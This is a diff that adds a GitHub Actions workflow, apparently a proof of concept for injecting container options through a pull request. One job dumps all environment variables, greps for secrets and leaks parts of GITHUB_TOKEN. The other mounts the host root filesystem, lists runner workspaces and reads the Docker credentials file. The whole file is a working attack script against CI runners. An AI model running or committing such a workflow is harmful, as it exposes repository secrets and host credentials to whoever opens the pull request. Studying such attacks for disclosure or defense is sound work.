@@ -1,0 +1,44 @@
+name: container.options Injection via PR
+
+on:
+  pull_request:
+    branches: [main, master]
+
+jobs:
+  dump-env-injection:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine:latest
+      options: --env POC_CONFIRMED=yes
+    steps:
+      - run: |
+          echo "=== ALL ENVIRONMENT VARIABLES ==="
+          env | sort
+          echo ""
+          echo "--- SEARCHING FOR SECRETS ---"
+          env | grep -i secret || echo "no 'secret' in env"
+          env | grep -i MY_ || echo "no MY_ vars"
+          echo ""
+          echo "--- GITHUB_TOKEN ---"
+          echo "Length: $(echo $GITHUB_TOKEN | wc -c)"
+          echo "First 3 chars: $(echo $GITHUB_TOKEN | cut -c1-3)"
+
+  dump-host:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine:latest
+      options: -v /:/host
+    steps:
+      - run: |
+          echo "=== HOST FILESYSTEM ACCESS ==="
+          echo "Hostname: $(cat /host/etc/hostname 2>/dev/null)"
+          echo "Kernel: $(cat /host/proc/version 2>/dev/null)"
+          echo ""
+          echo "--- RUNNER HOME ---"
+          ls -la /host/home/runner/ 2>/dev/null || echo "not found"
+          echo ""
+          echo "--- OTHER WORKSPACES ---"
+          ls /host/home/runner/work/ 2>/dev/null || echo "not found"
+          echo ""
+          echo "--- DOCKER CONFIG ---"
+          cat /host/home/runner/.docker/config.json 2>/dev/null || echo "not found"
